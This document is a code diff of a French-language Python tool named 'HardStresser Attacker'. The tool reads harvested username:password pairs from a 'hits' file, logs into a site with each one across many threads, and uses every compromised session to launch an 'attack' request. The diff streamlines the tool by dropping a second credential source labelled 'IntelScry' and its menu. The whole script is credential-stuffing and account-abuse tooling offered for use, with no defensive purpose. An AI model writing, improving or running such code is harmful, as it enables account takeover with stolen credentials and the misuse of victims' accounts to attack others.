@@ -6,24 +6,6 @@ import re
 
 lock = threading.Lock()
 
-def parse_logins(file="login.txt"):
-    with open(file, "r", encoding="utf-8") as f:
-        content = f.read()
-    
-    entries = re.findall(
-        r'User:\s+(.+?)\n\s+Password:\s+(.+?)\n',
-        content
-    )
-    
-    valid = []
-    for user, password in entries:
-        user = user.strip()
-        password = password.strip()
-        if user != "—" and password != "—" and user != "" and password != "":
-            valid.append((user, password))
-    
-    return valid
-
 def parse_hits(file="hits.txt"):
     logins = []
     try:
@@ -38,7 +20,7 @@ def parse_hits(file="hits.txt"):
                     password = parts[1]
                     logins.append((username, password))
     except FileNotFoundError:
-        print(f"[!] Fichier {file} introuvable")
+        print(f"[!] Fichier hits.txt introuvable")
     return logins
 
 def launch_attack(session, html_username):
@@ -59,7 +41,7 @@ def launch_attack(session, html_username):
             },
             timeout=10
         )
-        print(f"[*] {html_username} -> Attack: {attack_res.text.strip()}")
+        print(f"[*] {html_username} -> {attack_res.text.strip()}")
     except Exception as e:
         print(f"[!] Attack erreur {html_username}: {e}")
 
@@ -79,50 +61,28 @@ def check_and_attack(username, password):
         )
 
         if "username" not in session.cookies:
-            print(f"[-] {username}:{password} - FAIL")
+            print(f"[-] {username} - FAIL")
             return
 
         html_username = session.cookies.get("username", "")
-        print(f"[+] Login OK: {html_username} -> Lancement attaque...")
+        print(f"[+] {html_username} connecte -> attaque...")
         launch_attack(session, html_username)
 
     except Exception as e:
-        print(f"[!] Erreur {username}:{password} - {e}")
-
-def run_from_hits(file="hits.txt", threads=50):
-    logins = parse_hits(file)
-    print(f"[*] {len(logins)} comptes charges depuis {file}")
-    print(f"[*] Lancement avec {threads} threads...\n")
-
-    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
-        futures = [executor.submit(check_and_attack, u, p) for u, p in logins]
-        concurrent.futures.wait(futures)
-
-    print(f"\n[+] Termine !")
-
-def run_from_logins(file="login.txt", threads=50):
-    logins = parse_logins(file)
-    print(f"[*] {len(logins)} comptes extraits de {file}")
-    print(f"[*] Lancement avec {threads} threads...\n")
-
-    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
-        futures = [executor.submit(check_and_attack, u, p) for u, p in logins]
-        concurrent.futures.wait(futures)
-
-    print(f"\n[+] Termine !")
+        print(f"[!] Erreur {username} - {e}")
 
 if __name__ == "__main__":
     print("=== HardStresser Attacker ===\n")
-    print("1. Depuis hits.txt")
-    print("2. Depuis login.txt (IntelScry)")
-    choice = input("Choix: ").strip()
 
     t = input("Nombre de threads (defaut 50): ").strip()
     threads = int(t) if t.isdigit() else 50
 
-    if choice == "1":
-        run_from_hits(threads=threads)
-    elif choice == "2":
-        run_from_logins(threads=threads)
-    else:
-        print("[!] Choix invalide")
+    logins = parse_hits()
+    print(f"[*] {len(logins)} comptes charges depuis hits.txt")
+    print(f"[*] Lancement avec {threads} threads...\n")
+
+    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
+        futures = [executor.submit(check_and_attack, u, p) for u, p in logins]
+        concurrent.futures.wait(futures)
+
+    print(f"\n[+] Termine !")
